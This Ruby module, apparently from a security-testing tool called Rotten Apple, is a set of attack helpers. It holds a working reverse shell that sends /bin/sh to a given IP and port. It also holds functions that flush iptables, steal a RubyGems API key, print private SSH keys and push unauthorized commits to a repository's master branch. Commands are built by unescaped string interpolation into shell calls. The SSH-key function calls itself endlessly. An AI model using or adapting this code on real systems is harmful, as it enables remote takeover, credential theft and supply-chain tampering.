require 'rotten_apple/common'
require 'tempfile'

module RottenApple
  module Attack
    include RottenApple::Common

    def nmap_segment(target, ports)
      cmd = "nmap -Pn -n --open -T4 -p #{ports.join(",")} #{target}"
      puts cmd
      result = `#{cmd}`
      puts result
      return result
    end

    def reverse_shell(ip, port)
      f=TCPSocket.open(ip, port).to_i
      exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)
    end

    def flush_iptables()
      cmd = "iptables -F"
      puts cmd
      result = `#{cmd}`
      puts result
      return result
    end

    def steal_rubygems_api_key()
      if key = get_rubygems_api_key
        puts "Ruby Gems API Key " + key
        return key
      else
        return nil
      end
    end

    def install_software(name)
      cmd = "apt-get install #{name}"
      puts cmd
      result = `#{cmd}`
      puts result
      return result
    end

    def commit_to_master()
      if get_github_ssh_auth_user

        git_path = get_git_fetch_dir

        cmds = [
          "mkdir testing",
          "git clone #{git_path} testing",
          "cd testing",
          'echo "TEST" >> README.md',
          'git diff',
          'git commit -a -m "Rotten Apple Commit to Master"',
          'git push origin master',
          'rm -Rf testing'
        ]

        cmd = cmds.join(" && ")
        result = `#{cmd}`
        puts result

        return result
      end
    end

    def get_private_ssh_keys
      keys = get_private_ssh_keys

      keys.each do |private_key|
        puts private_key
      end

      return keys
    end

  end
end